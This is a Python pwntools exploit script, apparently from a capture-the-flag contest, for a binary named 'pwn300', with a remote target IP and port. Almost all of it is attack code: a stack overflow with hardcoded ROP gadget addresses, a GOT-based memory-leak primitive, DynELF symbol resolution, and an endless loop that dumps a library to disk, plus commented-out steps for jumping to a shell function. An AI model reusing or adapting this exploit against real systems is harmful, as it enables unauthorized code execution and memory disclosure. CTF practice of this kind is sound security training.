#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys
 
# switches
DEBUG = 0
LOCAL = 1
VERBOSE = 1
 
# modify this
if LOCAL:
    io = process('./pwn300')
else:
    io = remote('119.28.63.211',2339)
 
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
 
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
 
def rn(count):
    return io.recvn(count)
 
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
 
def sl(data):
    return io.sendline(data)
 
def sn(data):
    return io.send(data)
 
def info(string):
    return log.info(string)
 
def dehex(s):
    return s.replace(' ','').decode('hex')
 
def limu8(x):
    return c_uint8(x).value
 
def limu16(x):
    return c_uint16(x).value
 
def limu32(x):
    return c_uint32(x).value
 
# define interactive functions here
 
def recursive():
    for i in xrange(10):
        ru('fuck me!\n')
        payload = 40 * 'a' + p64(0x4004a9)
        sn(payload.ljust(0xa0))
    return
 
def leak(addr, length=40):
    ru('fuck me!\n')
    pad = 40 * 'A'
    pop6 = 0x40049e
    callframe = 0x400484
    write_got = 0x601018
    payload = pad + p64(pop6) + p64(write_got) + p64(length) + p64(addr) + p64(1) + p64(callframe) + p64(0) * 7 + p64(0x4004A9)
    print len(payload)
    assert len(payload) <= 0xa0
    sn(payload.ljust(0xa0))
    return ra(length)
 
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    recursive()
    dynelf = DynELF(leak, elf=ELF("./pwn300"))
    #r = leak(0x601018)
    #hexdump(r)
    libgetshell = dynelf.lookup(None, "libgetshell")
    # getshell = dynelf.lookup('getshell', 'libgetshell')
     
    info("Libgetshell = " + hex(libgetshell))
    # info("Getshell = " + hex(getshell))
 
    # ru('fuck me!\n')
    # payload = 40 * 'a' + p64(getshell)
    # sn(payload.ljust(0xa0))
    
    f = open('libgetshell.dump', 'wb')
    while 1:
        f.write(leak(libgetshell, 0x1000))
        libgetshell += 0x1000
    
 
    io.interactive()
    return
 
if __name__ == '__main__':
    pwn()

  ### the exp come from Nu1l